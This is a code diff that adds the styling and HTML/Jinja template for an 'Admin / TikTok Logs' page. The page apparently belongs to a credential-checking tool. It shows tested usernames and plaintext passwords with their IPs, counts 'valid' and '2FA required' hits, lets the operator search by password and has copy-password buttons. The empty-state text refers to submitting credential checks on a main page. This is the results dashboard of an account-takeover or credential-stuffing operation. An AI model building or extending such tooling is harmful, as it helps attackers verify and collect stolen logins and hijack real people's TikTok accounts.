@@ -188,4 +188,259 @@
     table {
       width: 100%;
       border-collapse: collapse;
-      font-size:
+      font-size: 13px;
+    }
+
+    thead th {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 10px 14px;
+      text-align: left;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    tbody tr {
+      border-bottom: 1px solid var(--border);
+      transition: background 0.1s;
+    }
+
+    tbody tr:hover { background: var(--surface2); }
+
+    tbody td {
+      padding: 11px 14px;
+      color: var(--text);
+      max-width: 240px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .td-time {
+      color: var(--muted);
+      font-size: 12px;
+      white-space: nowrap;
+    }
+
+    .td-user { font-weight: 600; }
+
+    .td-pw {
+      font-family: "Courier New", monospace;
+      font-size: 12px;
+      color: var(--yellow);
+      letter-spacing: 0.5px;
+    }
+
+    .td-ip {
+      color: var(--muted);
+      font-size: 12px;
+      font-family: monospace;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 3px 9px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+
+    .badge.valid            { background: rgba(34,197,94,0.12);  color: var(--green);  border: 1px solid rgba(34,197,94,0.25); }
+    .badge.bad_password     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.invalid_user     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.login_failed     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.error            { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.feedback_required{ background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.rate_limited     { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.25); }
+    .badge.2fa_required         { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.challenge_required   { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.recaptcha_challenge  { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.contact_point_required { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.timeout { background: rgba(245,158,11,0.12); color: var(--yellow); border: 1px solid rgba(245,158,11,0.25); }
+    .badge.config_error { background: rgba(239,68,68,0.12); color: var(--red); border: 1px solid rgba(239,68,68,0.25); }
+    .badge.api_error { background: rgba(239,68,68,0.12); color: var(--red); border: 1px solid rgba(239,68,68,0.25); }
+    .badge.user_not_found { background: rgba(239,68,68,0.12); color: var(--red); border: 1px solid rgba(239,68,68,0.25); }
+    .badge.auth_error { background: rgba(239,68,68,0.12); color: var(--red); border: 1px solid rgba(239,68,68,0.25); }
+
+    .td-msg {
+      color: var(--muted);
+      font-size: 12px;
+      max-width: 260px;
+    }
+
+    .empty {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--muted);
+    }
+
+    .empty-icon { font-size: 40px; margin-bottom: 12px; }
+    .empty p { font-size: 14px; }
+
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--muted);
+      font-size: 11px;
+      margin-left: 6px;
+      padding: 2px 4px;
+      border-radius: 3px;
+      transition: color 0.15s;
+      vertical-align: middle;
+    }
+
+    .copy-btn:hover { color: var(--text); }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <div class="tt-dot"></div>
+    <h1>Admin <span>/ TikTok Logs</span></h1>
+  </div>
+  <div class="header-right">
+    <span class="badge-count" id="totalCount">{{ logs|length }} entries</span>
+    <button class="btn-clear" onclick="clearLogs()">Clear All</button>
+  </div>
+</header>
+
+<!-- Stats -->
+{% set valid_count    = logs | selectattr('status', 'equalto', 'valid')       | list | length %}
+{% set twofa_count    = logs | selectattr('status', 'equalto', '2fa_required')| list | length %}
+{% set bad_pw_count   = logs | selectattr('status', 'equalto', 'bad_password') | list | length %}
+{% set other_count    = logs | length - valid_count - twofa_count - bad_pw_count %}
+
+<div class="stats">
+  <div class="stat-card">
+    <div class="stat-label">Total Checks</div>
+    <div class="stat-value blue">{{ logs|length }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Valid</div>
+    <div class="stat-value green">{{ valid_count }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">2FA Required</div>
+    <div class="stat-value yellow">{{ twofa_count }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Bad Password</div>
+    <div class="stat-value red">{{ bad_pw_count }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">Other</div>
+    <div class="stat-value" style="color:var(--muted)">{{ other_count }}</div>
+  </div>
+</div>
+
+<!-- Toolbar -->
+<div class="toolbar">
+  <div class="search-wrap">
+    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input type="text" id="searchInput" placeholder="Search username or password…" oninput="filterTable()" />
+  </div>
+  <select class="filter-select" id="statusFilter" onchange="filterTable()">
+    <option value="">All statuses</option>
+    <option value="valid">Valid</option>
+    <option value="bad_password">Bad Password</option>
+    <option value="invalid_user">Invalid User</option>
+    <option value="2fa_required">2FA Required</option>
+    <option value="challenge_required">Challenge Required</option>
+    <option value="rate_limited">Rate Limited</option>
+    <option value="feedback_required">Feedback Required</option>
+    <option value="error">Error</option>
+    <option value="timeout">Timeout</option>
+    <option value="user_not_found">User Not Found</option>
+    <option value="config_error">Config Error</option>
+    <option value="api_error">API Error</option>
+    <option value="auth_error">Auth Error</option>
+  </select>
+</div>
+
+<!-- Table -->
+<div class="table-wrap">
+  {% if logs %}
+  <table id="logTable">
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Timestamp</th>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Status</th>
+        <th>Message</th>
+        <th>IP</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for log in logs %}
+      <tr data-status="{{ log.status }}" data-user="{{ log.username }}" data-pw="{{ log.password }}">
+        <td class="td-time">{{ loop.index }}</td>
+        <td class="td-time">{{ log.timestamp }}</td>
+        <td class="td-user">{{ log.username }}</td>
+        <td class="td-pw">
+          {{ log.password }}
+          <button class="copy-btn" onclick="copyText('{{ log.password }}', this)" title="Copy">⎘</button>
+        </td>
+        <td>
+          <span class="badge {{ log.status }}">{{ log.status | replace('_', ' ') | title }}</span>
+        </td>
+        <td class="td-msg" title="{{ log.message }}">{{ log.message }}</td>
+        <td class="td-ip">{{ log.ip }}</td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+  {% else %}
+  <div class="empty">
+    <div class="empty-icon">📋</div>
+    <p>No TikTok credential checks logged yet.<br>Submit a check on the main page to see results here.</p>
+  </div>
+  {% endif %}
+</div>
+
+<script>
+  function filterTable() {
+    const q      = document.getElementById('searchInput').value.toLowerCase();
+    const status = document.getElementById('statusFilter').value;
+    const rows   = document.querySelectorAll('#logTable tbody tr');
+    let visible  = 0;
+
+    rows.forEach(row => {
+      const user   = row.dataset.user.toLowerCase();
+      const pw     = row.dataset.pw.toLowerCase();
+      const st     = row.dataset.status;
+      const matchQ = !q || user.includes(q) || pw.includes(q);
+      const matchS = !status || st === status;
+      const show   = matchQ && matchS;
+      row.style.display = show ? '' : 'none';
+      if (show) visible++;
+    });
+
+    document.getElementById('totalCount').textContent = visible + ' entries';
+  }
+
+  function copyText(text, btn) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = '✓';
+      setTimeout(() => btn.textContent = orig, 1200);
+    });
+  }
+
+  async function clearLogs() {
+    if (!confirm('Delete all logs? This cannot be undone.')) return;
+    await fetch('/admin/clear', { method: 'POST' });
+    location.reload();
+  }
+</script>
+
+</body>
+</html>
